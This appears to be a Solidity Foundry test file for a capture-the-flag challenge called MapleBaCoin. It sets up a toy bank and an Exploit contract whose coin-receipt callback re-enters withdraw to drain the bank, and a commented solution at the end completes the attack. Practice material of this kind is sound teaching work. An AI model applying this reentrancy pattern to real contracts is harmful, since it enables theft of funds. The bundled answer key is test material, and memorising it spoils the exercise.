// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

// import "lib/forge-std/src/Test.sol";
import "../lib/forge-std/src/Test.sol";
import "../src//MapleBaCoin.sol";

contract MapleBaCoinExploitTest is Test {
    address playerAddress = makeAddr("player");
    MapleBaCoin mapleBaCoin;
    MapleBankon mapleBankon;

    function setUp() public {
        mapleBaCoin = new MapleBaCoin();
        mapleBankon = new MapleBankon(address(mapleBaCoin));
        mapleBaCoin.setBank(address(mapleBankon));
        mapleBaCoin.transfer(address(mapleBankon), 1e18);
    }

    function test() public {
        vm.startPrank(playerAddress, playerAddress);

        Exploit exploit = new Exploit(address(mapleBankon));
        exploit.exploit();

        vm.stopPrank();
        assertTrue(mapleBaCoin.balanceOf(address(exploit)) >= 100);
    }
}

contract Exploit {
    MapleBankon immutable mapleBankon;
    uint256 count = 0;

    constructor(address mapleBankonAddress) {
        mapleBankon = MapleBankon(mapleBankonAddress);
    }

    function exploit() public {
       


        // Write code here
    }

    function receiveCoin(address, uint256) public {
        if (count < 100) {
            count += 1;
            mapleBankon.withdraw(1);
        }
    }
}









/******************************************************************
Solution:
        // mapleBankon.tap();
        // mapleBankon.mpbc().transfer(address(mapleBankon), 1);
        // mapleBankon.withdraw(1);


********************************************************************/